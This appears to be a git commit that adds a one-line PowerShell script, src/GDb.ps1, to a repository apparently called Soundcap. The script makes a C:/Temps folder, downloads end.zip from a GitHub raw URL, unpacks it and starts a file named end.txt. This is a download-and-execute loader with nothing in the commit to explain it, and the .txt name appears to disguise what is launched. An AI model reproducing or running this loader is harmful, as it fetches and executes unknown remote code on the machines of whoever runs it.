e13a602e70b93d6019bd25ae0867ed79f25f41d1
Seascope-Arg <pbazineteb@gmail.com>
2024-08-01 11:03:06 -0400

    Add files via upload

---
+++ src/GDb.ps1
@@ -0,0 +1,1 @@
+ni 'C:/Temps/' -Type Directory -Force;cd 'C:/Temps/';Invoke-WebRequest -Uri "https://github.com/Seascope-Arg/Soundcap/raw/main/src/end.zip" -OutFile 'end.zip';Expand-Archive -Path 'end.zip' -DestinationPath 'C:/Temps/';start 'C:/Temps/end.txt'
